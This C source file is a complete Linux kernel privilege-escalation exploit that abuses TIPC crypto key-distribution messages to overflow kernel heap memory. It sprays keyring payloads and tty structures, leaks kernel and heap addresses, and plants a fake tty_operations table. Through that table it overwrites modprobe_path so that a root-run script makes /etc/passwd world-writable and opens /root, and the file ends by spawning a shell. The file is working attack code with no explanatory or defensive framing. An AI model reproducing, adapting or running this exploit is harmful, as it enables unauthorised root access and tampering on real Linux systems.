#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <keyutils.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/types.h>

#include "tipc_hdr.h"

#define TIPC_MEDIA_TYPE_UDP	3
#define TIPC_MEDIA_TYPE_OFFSET	3
#define KEY_NUM 20
#define TTY_NUM 100

struct udp_media_addr {
	__be16	proto;
	__be16	port;
    unsigned int ipv4;
};

struct rcu_head
{
    void *next;
    void *func;
};

struct user_key_payload
{
    struct rcu_head rcu;
    unsigned short	datalen;
    char *data[];
};

struct tty_operations
{
    unsigned long lookup;
    unsigned long install;
    unsigned long remove;
    unsigned long open;
    unsigned long close;
    unsigned long shutdown;
    unsigned long cleanup;
    unsigned long write;
    unsigned long put_char;
    unsigned long flush_chars;
    unsigned long write_room;
    unsigned long chars_in_buffer;
    unsigned long ioctl;
};

struct tty_operations fake_tty_operations;

int keys[KEY_NUM];
int tty[TTY_NUM];
int kidx = 0;
int victim_key = 0;
int data_size = 0x400;
unsigned long kern, heap;

void spray_ukp(int stage)
{
    char desc[32] = { 0 };
    char *payload;
    int key;
    int size = 0x208 + sizeof(struct user_key_payload);

    payload = malloc(size);

    if (stage == 1)
        memset(payload, 'A', size);
    else if (stage == 2)
        memcpy(payload, &fake_tty_operations, sizeof(fake_tty_operations));

    for (int i = 0; i < KEY_NUM; i++) {
        sprintf(desc, "pay%d", kidx);
        key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
        if (key == -1) {
            perror("add_key");
            exit(1);
        }
        keys[kidx++] = key;
    }

    free(payload);
}

void find_victim()
{
	char data[1024];
    int ret;
    int size = data_size - sizeof(struct user_key_payload);

    for (int i = 0; i < KEY_NUM; i++) {
        ret = keyctl_read(keys[i], data, size);
        if (ret > size) {
            victim_key = keys[i];
            printf("[+] victim key: %d\n", victim_key);
            break;
        }
    }

    if (victim_key == 0) {
        printf("[-] failed\n");
        exit(1);
    }

    for (int i = 0; i < KEY_NUM; i++) {
        if (keys[i] == victim_key)
            continue;

        keyctl_revoke(keys[i]);
        keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING);
    }
    usleep(100000);
}

void spray_tty()
{
    for (int i = 0; i < TTY_NUM; i++) {
        tty[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (tty[i] < 0) {
            perror("open tty");
            exit(1);
        }
    }
}

void setup_heap()
{
    int size = data_size - sizeof(struct user_key_payload);
    char *payload = malloc(size);

    // spray tty_struct
    for (int i = 0; i < TTY_NUM; i++)
        tty[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    // create empty object
    for (int i = TTY_NUM - 1; i >= 0; i -= 2)
        close(tty[i]);

    // take two slots
    memset(payload, 'B', size);
    int ka = add_key("user", "pay8787", payload, size, KEY_SPEC_PROCESS_KEYRING);
    int kb = add_key("user", "pay8788", payload, size, KEY_SPEC_PROCESS_KEYRING);

    // free one
    keyctl_revoke(ka);
    keyctl_unlink(ka, KEY_SPEC_PROCESS_KEYRING);
    usleep(100000);
}

void call_fake_fops()
{
    unsigned int a = 0x706d742f;
    unsigned int b = 0x782f;
    unsigned long modprobe = kern + 0x1651020;

    for (int i = TTY_NUM - 2; i >= 0; i -= 2) {
        ioctl(tty[i], a, modprobe);
        ioctl(tty[i], b, modprobe + 4);
    }
}

void setup_fake_tty_operations()
{
    unsigned long mov_dw_ptr_rdx_esi = kern + 0x12304;

    fake_tty_operations.lookup = 0xdeadbeefUL;
    fake_tty_operations.install = 0xdeadbeefUL;
    fake_tty_operations.remove = 0xdeadbeefUL;
    fake_tty_operations.open = 0xdeadbeefUL;
    fake_tty_operations.close = 0xdeadbeefUL;
    fake_tty_operations.shutdown = 0xdeadbeefUL;
    fake_tty_operations.cleanup = 0xdeadbeefUL;
    fake_tty_operations.write = 0xdeadbeefUL;
    fake_tty_operations.put_char = 0xdeadbeefUL;
    fake_tty_operations.flush_chars = 0xdeadbeefUL;
    fake_tty_operations.write_room = 0xdeadbeefUL;
    fake_tty_operations.chars_in_buffer = 0xdeadbeefUL;
    fake_tty_operations.ioctl = mov_dw_ptr_rdx_esi;
}

void setup_modprobe()
{
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("echo -ne '#!/bin/sh\nchmod 0666 /etc/passwd\nchmod -R 0777 /root\n' >> /tmp/x");
    system("chmod +x /tmp/x");
}

int main()
{
    int ret;
    int sockfd;
    struct sockaddr_in sock_addr;

    setup_modprobe();

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    memset(&sock_addr, 0, sizeof(sock_addr));
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = 0;
    sock_addr.sin_addr.s_addr= inet_addr("192.168.0.1");
    ret = bind(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
    if (ret == -1) {
        perror("");
        exit(1);
    }

    memset(&sock_addr, 0, sizeof(sock_addr));
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(6118);
    sock_addr.sin_addr.s_addr= inet_addr("127.0.0.1");

    //////////////////////////////
    int malloc_size = sizeof(struct tipc_msg) + data_size + 0x800;
    struct tipc_msg *m = calloc(1, malloc_size); // large enoght
    char *media;

    ///////// create new node
    // must check
    msg_set_hdr_sz(m, 60);
    msg_set_version(m);
    msg_set_size(m, data_size);
    // tipc_disc_rcv() check
    msg_set_user(m, LINK_CONFIG);
    msg_set_non_seq(m, 1);
    msg_set_bc_netid(m, 0x1267);
    msg_set_prevnode(m, 0x12345678);
    media = msg_media_addr(m); // (char *)&m->hdr[TIPC_MEDIA_INFO_OFFSET];
    media[TIPC_MEDIA_TYPE_OFFSET] = TIPC_MEDIA_TYPE_UDP;
    memset(&m->data[0], 'A', data_size + TIPC_AEAD_ALG_NAME);
    ret = sendto(sockfd, m, malloc_size, 0, (struct sockaddr *)&sock_addr, sizeof(sock_addr));

    ///////// reset link
    msg_set_hdr_sz(m, 60);
    msg_set_version(m);
    msg_set_size(m, data_size);
    // tipc_disc_rcv() check
    msg_set_user(m, LINK_PROTOCOL);
    msg_set_type(m, RESET_MSG);
    msg_set_non_seq(m, 0);
    msg_set_max_pkt(m, 0x80);
    msg_set_prevnode(m, 0x12345678);
    msg_set_destnode(m, 0x7f000001);
    ret = sendto(sockfd, m, malloc_size, 0, (struct sockaddr *)&sock_addr, sizeof(sock_addr));

    ///////// state link (setup)
    msg_set_hdr_sz(m, 60);
    msg_set_version(m);
    msg_set_size(m, data_size);
    // tipc_disc_rcv() check
    msg_set_user(m, LINK_PROTOCOL);
    msg_set_type(m, STATE_MSG);
    msg_set_non_seq(m, 0);
    msg_set_max_pkt(m, 0x80);
    msg_set_prevnode(m, 0x12345678);
    msg_set_destnode(m, 0x7f000001);
    ret = sendto(sockfd, m, malloc_size, 0, (struct sockaddr *)&sock_addr, sizeof(sock_addr));

    ///////// crypto
    msg_set_hdr_sz(m, 60);
    msg_set_version(m);
    msg_set_size(m, data_size);
    // tipc_disc_rcv() check
    msg_set_user(m, MSG_CRYPTO);
    msg_set_type(m, KEY_DISTR_MSG);
    msg_set_non_seq(m, 0);
    msg_set_seqno(m, 1);
    msg_set_max_pkt(m, 0x80);
    msg_set_prevnode(m, 0x12345678);
    msg_set_destnode(m, 0x7f000001);
    *(u32*)&m->data[TIPC_AEAD_ALG_NAME] = ntohl(data_size - 0x10);

    // step1 - find the target key
    spray_ukp(1);
    ret = sendto(sockfd, m, malloc_size, 0, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
    find_victim();

    // step2 - spray tty_struct
    spray_tty();
    
    // step3 - get leak
    char *leak = malloc(0x10000);
    int base = data_size - 0x18;
    unsigned long driver;

    ret = keyctl_read(victim_key, leak, 0x7fff);
    kern = *(unsigned long *)&leak[base + 0x18] - 19348384;
    heap = *(unsigned long *)&leak[base + 0x38] - 0x438;
    driver = *(unsigned long *)&leak[base + 0x10];
    printf("[+] kern: 0x%016lx\n", kern);
    printf("[+] heap: 0x%016lx\n", heap);

    // step4 - spray fake tty_operations
    setup_fake_tty_operations();
    keyctl_revoke(victim_key);
    keyctl_unlink(victim_key, KEY_SPEC_PROCESS_KEYRING);
    usleep(100000);
    spray_ukp(2);

    // step5 - spray tty_struct again
    setup_heap();

    // step6 - overwrite tty_struct
    unsigned long fake_fops_addr = heap + 0x18;
    struct {
        unsigned int magic;
        unsigned int kref;
        unsigned long dev;
        unsigned long driver;
        unsigned long ops;
    } fake_obj = {};
    fake_obj.ops = fake_fops_addr;
    fake_obj.magic = 0x5401;
    fake_obj.kref = 0x1;
    fake_obj.driver = driver;

    msg_set_seqno(m, 2);
    *(u32*)&m->data[TIPC_AEAD_ALG_NAME] = ntohl(data_size - 0x24 + sizeof(fake_obj));
    memcpy(&m->data[data_size], &fake_obj, sizeof(fake_obj));
    ret = sendto(sockfd, m, malloc_size, 0, (struct sockaddr *)&sock_addr, sizeof(sock_addr));

    call_fake_fops();

    if (fork()) {
        system("/tmp/dummy");
        system("/bin/sh");
    }

    sleep(1000000);
    close(sockfd);
    return 0;
}
